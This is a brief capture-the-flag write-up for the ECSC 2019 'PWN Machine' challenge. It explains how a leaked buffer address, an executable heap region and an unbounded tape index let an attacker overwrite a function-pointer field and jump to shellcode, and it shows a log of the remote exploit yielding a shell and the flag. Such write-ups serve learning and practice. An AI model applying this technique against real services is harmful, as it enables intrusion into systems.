# PWN Machine (shellcode)
I was really happy not having to reverse engineer the sample code given in the challenge. I've solved this task quite quickly and so I believe there is a cleaner way to pwn it. Moreover as this challenge does not provide any new tricks it's going to be writeup only for myself I will keep it super short.

## Notes
As there was no binary provided I've assumed that there are all standard protections enabled – ASLR, cookies, PIE. Also by connecting to the challenge and looking at leaked `buffer` address we know that the binary was compiled as a 32 bit application:

```console
$ nc ecsc19.hack.cert.pl 25012
[D] Allocated memory at 0xf7424008
Input (𝑄, 𝚺, 𝐹):

```

## Vulnerability
There are few things which caught my eye.
1) The address of the buffer is being leaked as `DEBUG` variable is set.

```c
#define DEBUG 1

[...]

char *buffer = (char*)malloc(buffer_size);
if (buffer < 0){
    puts("[E] Error, couldn't allocate memory, contact admin");
}
#ifdef DEBUG
else {
    printf("[D] Allocated memory at %p\n", buffer);
}
#endif
```

2) The memory for tape and moves is set to executable:

```c
int m = mprotect((void*)((int)buffer & ~(4096-1)), buffer_size, PROT_READ | PROT_WRITE | PROT_EXEC);
```

3) There is no limitation on `head_position` and the following statement

```c
tape[*head_position] = moves[i].to_tape;
```

looks quite powerful.

4) The `direction` field. Really there is an easier way to implement such functionality

5) moves and tape is placed next to each other:

```c
tape_char *tape = (tape_char*)buffer;
move *moves = (move*)(buffer+MAX_TAPE_SIZE*sizeof(tape_char));
```

## Exploitation
So combining all 5 above points, we can:
1) place shellcode at the begining of the tape,
2) move head_position to point to move[0],
3) using `tape[head_position] = moves[i].to_tape` overwrite `direction` field of move[0] with address of tape,
4) make sure move[0] gets called and so we jump to our shellcode.

The hardest part is manipulating the `moves`/`tape` to build exploit.

## POC
[Full exploit](exp.py)

```console
$ python3 exp.py remote
[x] Opening connection to ecsc19.hack.cert.pl on port 25012
[x] Opening connection to ecsc19.hack.cert.pl on port 25012: Trying 195.164.49.185
[+] Opening connection to ecsc19.hack.cert.pl on port 25012: Done
[*] tape_addr: 0xf7400008
[*] moves_addr: 0xf7402718
[*] Switching to interactive mode

$ id
uid=99999 gid=99999 groups=99999
$ cat /app/flag.txt
ecsc19{Church-TuringThesisAppliesToPWNsRight?}
```
